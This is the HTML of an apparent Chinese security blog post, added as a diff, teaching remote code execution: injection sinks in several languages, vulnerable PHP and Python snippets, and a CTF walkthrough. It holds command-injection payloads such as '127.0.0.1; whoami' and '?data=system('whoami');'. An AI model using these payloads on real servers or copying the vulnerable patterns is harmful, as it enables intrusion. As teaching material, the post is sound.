@@ -1,0 +1,1233 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>学校服务器RCE植入木马🤨 | choco</title><meta name="author" content="Teaaa"><meta name="copyright" content="Teaaa"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="⚠️ 安全警示：本内容仅用于安全原理学习，未经授权禁止对任何网站实施漏洞探测与攻击，未授权测试属于违法行为。 假设你重返-2岁，那学校才有可能存在这个漏洞，那么你就有可能通过该漏洞往学校服务器里面植入木马控制服务器，如果你真有那个本事，那你也别真去这样做，基础的 RCE 里面绕过方式占据了半壁江山，全是些奇技淫巧，下面小小的总结一下这个漏洞是怎么产生的以及一些利用方式。 CVE-2026-8504">
+<meta property="og:type" content="article">
+<meta property="og:title" content="学校服务器RCE植入木马🤨">
+<meta property="og:url" content="http://example.com/2026/09/11/%E5%AD%A6%E6%A0%A1%E6%9C%8D%E5%8A%A1%E5%99%A8RCE%E6%A4%8D%E5%85%A5%E6%9C%A8%E9%A9%AC%F0%9F%A4%A8/index.html">
+<meta property="og:site_name" content="choco">
+<meta property="og:description" content="⚠️ 安全警示：本内容仅用于安全原理学习，未经授权禁止对任何网站实施漏洞探测与攻击，未授权测试属于违法行为。 假设你重返-2岁，那学校才有可能存在这个漏洞，那么你就有可能通过该漏洞往学校服务器里面植入木马控制服务器，如果你真有那个本事，那你也别真去这样做，基础的 RCE 里面绕过方式占据了半壁江山，全是些奇技淫巧，下面小小的总结一下这个漏洞是怎么产生的以及一些利用方式。 CVE-2026-8504">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/head.jpg">
+<meta property="article:published_time" content="2026-09-11T08:10:45.883Z">
+<meta property="article:modified_time" content="2026-09-11T08:10:46.039Z">
+<meta property="article:author" content="Teaaa">
+<meta property="article:tag" content="漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/head.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "学校服务器RCE植入木马🤨",
+  "url": "http://example.com/2026/09/11/%E5%AD%A6%E6%A0%A1%E6%9C%8D%E5%8A%A1%E5%99%A8RCE%E6%A4%8D%E5%85%A5%E6%9C%A8%E9%A9%AC%F0%9F%A4%A8/",
+  "image": "http://example.com/img/head.jpg",
+  "datePublished": "2026-09-11T08:10:45.883Z",
+  "dateModified": "2026-09-11T08:10:46.039Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Teaaa",
+      "url": "http://www.baidu.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/nailong.jpg"><link rel="canonical" href="http://example.com/2026/09/11/%E5%AD%A6%E6%A0%A1%E6%9C%8D%E5%8A%A1%E5%99%A8RCE%E6%A4%8D%E5%85%A5%E6%9C%A8%E9%A9%AC%F0%9F%A4%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.7.1.260810"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        try {
+          const data = { value }
+
+          if (ttl != null) {
+            data.expiry = Date.now() + ttl * 86400000
+          }
+
+          localStorage.setItem(key, JSON.stringify(data))
+        } catch (e) {
+          console.error(e)
+        }
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":-1,"unescape":false,"pagination":{"enable":true,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '学校服务器RCE植入木马🤨',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>
+  /* 明亮模式 */
+  #body-wrap #recent-posts > .recent-post-item,
+  #body-wrap .recent-post-item,
+  #body-wrap #aside-content .card-widget,
+  #body-wrap .layout > div:first-child:not(.recent-posts),
+  #body-wrap #nav .menus_items .menus_item .menus_item_child,
+  #body-wrap #pagination .page-number:not(.current),
+  #body-wrap #pagination .extend {
+      background: rgba(255, 255, 255, 0.92);
+      backdrop-filter: blur(2px);
+      -webkit-backdrop-filter: blur(2px);
+      border: 1px solid rgba(255, 255, 255, 0.85);
+      box-shadow: 0 8px 16px -4px rgba(138, 138, 138, 0.15);
+      transition: background 0.3s ease, border 0.3s ease, box-shadow 0.3s ease;
+  }
+  #body-wrap #pagination .page-number:not(.current):hover,
+  #body-wrap #pagination .extend:hover {
+      background: #ff7142d2;
+      border-color: #ff7142d2;
+      color: #fff;
+  }
+  /* 夜间模式 */
+  html[data-theme="dark"] #body-wrap #recent-posts > .recent-post-item,
+  html[data-theme="dark"] #body-wrap .recent-post-item,
+  html[data-theme="dark"] #body-wrap #aside-content .card-widget,
+  html[data-theme="dark"] #body-wrap .layout > div:first-child:not(.recent-posts),
+  html[data-theme="dark"] #body-wrap #nav .menus_items .menus_item .menus_item_child,
+  html[data-theme="dark"] #body-wrap #pagination .page-number:not(.current),
+  html[data-theme="dark"] #body-wrap #pagination .extend {
+      background: rgba(30, 30, 30, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: 0 8px 16px -4px rgba(0, 0, 0, 0.2);
+  }
+  /*亮色模式强制文字颜色*/
+  .recent-post-item .article-title{
+    color:#111 !important;
+  }
+  .recent-post-item .article-meta-wrap,
+  .recent-post-item .content{
+      color:#222 !important;
+  }
+  /*夜间模式文字颜色*/
+  html[data-theme="dark"] .recent-post-item .article-title{
+    color:#f1f1f1 !important;
+  }
+  html[data-theme="dark"] .recent-post-item .article-meta-wrap,
+  html[data-theme="dark"] .recent-post-item .content{
+    color:#dddddd !important;
+  }
+  
+</style>
+<meta name="generator" content="Hexo 7.3.0"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/dahai.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://www.baidu.com"><i class="fa-fw fa fa-circle"></i><span> 虫洞</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/yuan.png" alt="Logo"><span class="site-name">choco</span></a><a class="nav-page-title" href="/"><span class="site-name">学校服务器RCE植入木马🤨</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://www.baidu.com"><i class="fa-fw fa fa-circle"></i><span> 虫洞</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">学校服务器RCE植入木马🤨</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-09-11T08:10:45.883Z" title="发表于 2026-09-11 16:10:45">2026-09-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-09-11T08:10:46.039Z" title="更新于 2026-09-11 16:10:46">2026-09-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">10747</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>43 分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>⚠️ 安全警示：本内容仅用于安全原理学习，未经授权禁止对任何网站实施漏洞探测与攻击，未授权测试属于违法行为。</p>
+<p>假设你重返-2岁，那学校才有可能存在这个漏洞，那么你就有可能通过该漏洞往学校服务器里面植入木马控制服务器，如果你真有那个本事，那你也别真去这样做，基础的 RCE 里面绕过方式占据了半壁江山，全是些奇技淫巧，下面小小的总结一下这个漏洞是怎么产生的以及一些利用方式。</p>
+<p><strong>CVE-2026-85046</strong>：<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2026-85046?f_link_type=f_linkinlinenote&flow_extra=eyJpbmxpbmVfZGlzcGxheV9wb3NpdGlvbiI6MCwiZG9jX3Bvc2l0aW9uIjowLCJkb2NfaWQiOiI3ZjRkZjBlMDVkODU0MWE3LTQxMzNkZmE1MWUxMzQ4MWIifQ==">NVD-CVE-2026-85046</a></p>
+<p>刚看到chrome出洞了，这个漏洞是<strong>浏览器客户端 RCE</strong>，不是服务器端 RCE，我们下面要讲的是服务器端的RCE，不过也是RCE，顺带提一提吧：CVE-2026-85046 是近期曝光、已经在野外被实际利用的 Chromium V8 引擎高危零日漏洞，漏洞类型为<strong>类型混淆（CWE-843）</strong>，CVSS 评分 8.8 分，可实现远程代码执行（RCE）。该漏洞存在于 Chrome、Edge、Opera 等所有基于 Chromium 内核浏览器的 V8 JavaScript 与 WebAssembly 引擎中。攻击者只需要诱导目标访问精心构造的恶意 HTML 页面，利用 V8 引擎错误处理对象数据类型的缺陷，在浏览器沙箱内实现内存任意读写，搭配沙箱逃逸链路，最终完成远程代码执行。成功利用后，攻击者可在受害者主机执行任意指令，窃取账号凭证、植入恶意程序，完全接管受害终端。受影响版本为 Chrome 152.0.7977.82 之前版本，厂商已经发布补丁。</p>
+<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>RCE 远程代码执行（Remote Code Execution）攻击者无需本地访问，就能在目标服务器 &#x2F; 主机上执行任意代码、系统命令的高危漏洞，属于最高危漏洞类别之一，OWASP Top10 里的注入类漏洞。<strong>漏洞成因</strong>核心一句话：存在开发人员使用的一些危险函数，程序把用户可控的外部输入，直接当作「系统命令」或「程序代码」交给解释器执行，没有做安全校验。</p>
+<p>分为远程<strong>命令</strong>执行（Command Injection，命令注入）执行<strong>系统原生命令</strong>（shell 命令） 攻击者远程执行目标系统的系统命令（如Linux的ls、cat命令，Windows的dir、ipconfig命令），多用于获取系统信息、遍历文件、创建后门等基础操作<strong>典型场景</strong>：Web应用中命令拼接未过滤、系统调用函数未校验输入。例子：</p>
+<blockquote>
+<p>PHP：<code>system()</code> &#x2F; <code>exec()</code> &#x2F; <code>shell_exec()</code> &#x2F; <code>passthru()</code><br>Python：<code>os.system()</code> &#x2F; <code>os.popen()</code><br>Java：<code>Runtime.getRuntime().exec(String)</code></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 危险写法：直接拼接字符串</span></span><br><span class="line">ip = <span class="built_in">input</span>(<span class="string">&quot;用户输入&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;ping &quot;</span> + ip)</span><br><span class="line"><span class="comment"># 用户输入：127.0.0.1; whoami</span></span><br><span class="line"><span class="comment"># 最终执行：ping 127.0.0.1; whoami</span></span><br></pre></td></tr></table></figure>
+
+<p>和远程<strong>代码</strong>执行（Code Injection，代码注入）直接注入编程语言代码（如PHP、Python、Java代码），由程序解释器执行，不是系统 shell 命令，可实现更复杂的操作（如植入木马、反弹shell、控制整个服务器）。<strong>典型场景</strong>：代码执行函数未过滤恶意代码、序列化漏洞导致代码执行（如 PHP<code>eval</code>会直接把字符串当成PHP代码执行）。常见场景：</p>
+<blockquote>
+<p>PHP：<code>eval()</code>、<code>assert()</code><br>Python：<code>exec()</code>、<code>eval()</code><br>NodeJS：<code>eval()</code>、<code>new Function()</code></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment"># payload：?data=system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="comment"># eval会直接把字符串当成PHP代码执行</span></span><br></pre></td></tr></table></figure>
+
+<img src="/img/rce01.png">
+
+<h2 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h2><p>我以前经常犯一个错，如：<code>eval(ls)</code>，显然不行，<code>eval()</code> 执行的是 PHP 代码，不是直接执行 bash 命令！<code>ls</code> 是 Linux shell 命令，<strong>不是 PHP 函数</strong>。</p>
+<p>注意：eval 要求语句完整，<strong>不要漏最后的分号</strong>，漏了直接报错</p>
+<p><code>eval(&quot;ls;&quot;)</code> → PHP 会把 <code>ls</code> 当成<strong>PHP 常量</strong>去寻找，PHP 里不存在叫<code>ls</code>的常量，直接抛出报错：<br><code>Warning: Use of undefined constant ls - assumed &#39;ls&#39;</code></p>
+<h2 id="和其他漏洞简单区分"><a href="#和其他漏洞简单区分" class="headerlink" title="和其他漏洞简单区分"></a>和其他漏洞简单区分</h2><ul>
+<li>RCE：执行<strong>系统命令 &#x2F; 代码</strong>，拿到服务器执行权限</li>
+<li>SQL 注入：操作<strong>数据库</strong>，只能读写数据库，一般不能直接执行系统命令</li>
+<li>XSS：在<strong>浏览器</strong>执行 JS，是客户端漏洞，不是服务器 RCE</li>
+<li>SSTI：模板注入，属于代码执行，归类广义 RCE</li>
+<li>路径穿越 + RCE：路径穿越仅能读写文件，整条利用链配合达成 RCE 效果，归类广义 RCE</li>
+<li>不安全反序列化：传入恶意序列化数据触发魔术方法 &#x2F;gadget 链，利用成功可执行代码，归类广义 RCE </li>
+<li>第三方组件漏洞：组件解析特殊数据包触发缺陷，利用成功可远程执行代码，归类广义 RCE</li>
+</ul>
+<p>不安全反序列化、模板注入SSTI、第三方组件漏洞（Log4j2、Spring4Shell）这类漏洞原理不属于传统的命令 &#x2F; 代码注入，但是漏洞利用成功最终效果是 RCE（远程代码执行），因此安全领域习惯称之为广义 RCE 。</p>
+<p>这里只围绕RCE经典的两种方式（狭义）记录，剩余的后续单开更新。</p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>RCE漏洞之所以被列为高危漏洞，核心在于其攻击成本低、危害后果严重，主要体现在三个方面：<br>1、攻击门槛低：无需复杂的技术储备，借助AI工具（如2026年主流的RCE漏洞扫描工具、Payload生成工具），新手也能快速利用已知RCE漏洞发起攻击；<br>2、危害范围广：可影响Web应用、服务器、物联网设备、工业控制系统等各类场景，一旦触发，攻击者可完全控制目标系统，窃取敏感数据、植入勒索软件、发起横向渗透；<br>3、难以快速处置：部分RCE漏洞利用后会删除日志、隐藏进程，导致安全人员难以溯源攻击源头，且漏洞修复需兼顾业务兼容性，修复周期较长。</p>
+<h2 id="回忆"><a href="#回忆" class="headerlink" title="回忆"></a>回忆</h2><p>我最开始接触CTF的时候，做了一道这样的题，当时学都没学根本看不懂，但是还是硬着头皮啃，长这样：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute_cmd</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>); <span class="comment">// 危险函数，执行系统命令，典型命令注入入口</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt_request</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$decoded_key</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$reversed_cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// 把传入的 cmd 字符串反转</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) - <span class="number">1</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">        <span class="variable">$reversed_cmd</span> .= <span class="variable">$cmd</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 计算反转后字符串的md5</span></span><br><span class="line">    <span class="variable">$hashed_reversed_cmd</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$reversed_cmd</span>);</span><br><span class="line">    <span class="comment">// 校验：md5(反转后的cmd) === base64解码后的key</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$hashed_reversed_cmd</span> !== <span class="variable">$decoded_key</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Invalid key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$decrypted_cmd</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decrypted_cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">execute_cmd</span>(<span class="title function_ invoke__">decrypt_request</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>现在来看其实就是很简单的一个 RCE，只不过构造 payload 逻辑绕了一点：<br>① 将<code>cmd</code>字符串<strong>反转</strong>得到<code>reversed_cmd</code><br>② 计算 <code>md5(reversed_cmd)</code><br>③ 将<code>key</code>做 base64 解码，判断是否等于上面 md5 值；不等则退出<br>④ 校验通过后，<strong>对原始<code>cmd</code>做 base64 解码</strong>，得到最终要执行的命令<br>⑤ 把解码后的命令传给 <code>system()</code> 执行 → <strong>RCE（命令注入）</strong></p>
+<h3 id="示例演示（执行-whoami）"><a href="#示例演示（执行-whoami）" class="headerlink" title="示例演示（执行 whoami）"></a>示例演示（执行 whoami）</h3><p>原始命令：<code>whoami</code><br>⑤ base64 编码得到 cmd：<code>d2hvYW1p</code><br>④ 反转 cmd 字符串：<code>p1YWhvd2</code><br>③ 计算 <code>md5(&quot;p1YWhvd2&quot;)</code><br>② 将 md5 结果 base64 编码，作为 key<br>① POST 提交：<code>cmd=d2hvYW1p&amp;key=base64(md5(&quot;p1YWhvd2&quot;))</code></p>
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>RCE无论是靶场还是CTF中，核心无非就是看懂代码逻辑后 <strong>构造Payload + 过滤绕过</strong>。（真实漏洞利用还包含理解漏洞原理、识别执行上下文、识别执行环境、权限与后续利用（getshell、信息收集）等），所以理解不同语言的一些常见函数是重要的。下面记录一下常见函数：</p>
+<h2 id="狭义-RCE-sink-对照"><a href="#狭义-RCE-sink-对照" class="headerlink" title="狭义 RCE sink 对照"></a>狭义 RCE sink 对照</h2><p>只要一门语言有”把字符串当代码跑”或”把字符串交给 shell”的 API，侠义 RCE 就存在。</p>
+<table>
+<thead>
+<tr>
+<th>语言</th>
+<th>代码执行</th>
+<th>命令执行</th>
+<th>存在性</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PHP</td>
+<td><code>eval</code>、<code>assert</code>、<code>create_function</code>、<code>preg_replace /e</code>、可变函数 <code>$fn()</code></td>
+<td><code>system/exec/shell_exec/passthru/popen/proc_open</code></td>
+<td>✅ 最密集</td>
+<td></td>
+</tr>
+<tr>
+<td>Python</td>
+<td><code>eval</code>、<code>exec</code>、<code>compile</code></td>
+<td><code>os.system/os.popen</code>、<code>subprocess(shell=True)</code></td>
+<td>✅</td>
+<td></td>
+</tr>
+<tr>
+<td>JS&#x2F;Node</td>
+<td><code>eval</code>、<code>new Function</code>、<code>vm.runIn*</code>、字符串 <code>setTimeout</code></td>
+<td><code>child_process.exec/execSync</code>、字符串 <code>spawn(shell:true)</code></td>
+<td>✅</td>
+<td></td>
+</tr>
+<tr>
+<td>Ruby</td>
+<td><code>eval</code>、<code>instance_eval</code></td>
+<td>反引号、<code>%x&#123;&#125;</code>、字符串 <code>system/spawn</code></td>
+<td>✅</td>
+<td></td>
+</tr>
+<tr>
+<td>Java</td>
+<td>无官方 eval（JDK 无），但脚本引擎 <code>ScriptEngine.eval</code> 是标准 API</td>
+<td><code>Runtime.exec</code>、<code>ProcessBuilder</code> 拼串</td>
+<td>✅（脚本&#x2F;命令两类都有）</td>
+<td></td>
+</tr>
+<tr>
+<td>C#</td>
+<td><code>Add-Type</code>&#x2F;CodeDom 编译执行、PowerShell SDK</td>
+<td><code>Process.Start</code> 拼串、<code>cmd /c</code></td>
+<td>✅</td>
+<td></td>
+</tr>
+<tr>
+<td>Perl</td>
+<td><code>eval</code></td>
+<td>反引号、<code>qx</code>、`open “</td>
+<td>cmd”<code>、字符串 </code>system`</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>C&#x2F;C++</td>
+<td>无解释型 sink，但 <code>system/popen</code>、动态库加载</td>
+<td><code>system/popen/ShellExecute</code></td>
+<td>✅（命令执行类）</td>
+<td></td>
+</tr>
+<tr>
+<td>Go</td>
+<td>无 eval 类（<code>plugin</code> 也不稳定）</td>
+<td><code>exec.Command(&quot;sh&quot;,&quot;-c&quot;, input)</code></td>
+<td>✅（命令执行类）</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>下面写出各类语言的危险函数，包含广义狭义：</p>
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="命令执行（调用系统-shell，都可套在eval中）"><a href="#命令执行（调用系统-shell，都可套在eval中）" class="headerlink" title="命令执行（调用系统 shell，都可套在eval中）"></a>命令执行（调用系统 shell，都可套在eval中）</h3><ol>
+<li><code>system(string $command)</code>：执行系统命令，输出命令结果，返回最后一行输出</li>
+<li><code>exec(string $command)</code>：执行命令，<strong>不直接输出</strong>，结果存入第二个参数数组，返回输出最后一行</li>
+<li><code>shell_exec(string $cmd)</code>：执行 shell 命令，返回完整字符串结果；无输出返回 null</li>
+<li><code>passthru(string $command)</code>：执行命令，直接把原始二进制输出输出到页面（适合二进制回显）</li>
+<li><code>popen()</code> &#x2F; <code>proc_open()</code>：创建进程执行命令，打开管道读写结果</li>
+<li><code>pcntl_exec() </code>： 在当前进程空间执行指定程序，当发生错误时返回 false ，没有错误时没有返回。</li>
+<li>&#96;（反引号）：同 shell_exec()</li>
+</ol>
+<h3 id="代码执行（解析-PHP-代码）"><a href="#代码执行（解析-PHP-代码）" class="headerlink" title="代码执行（解析 PHP 代码）"></a>代码执行（解析 PHP 代码）</h3><ol>
+<li><code>eval(string $code)</code>：<strong>最经典</strong>，将字符串作为 PHP 代码执行，末尾必须带分号 <code>;</code></li>
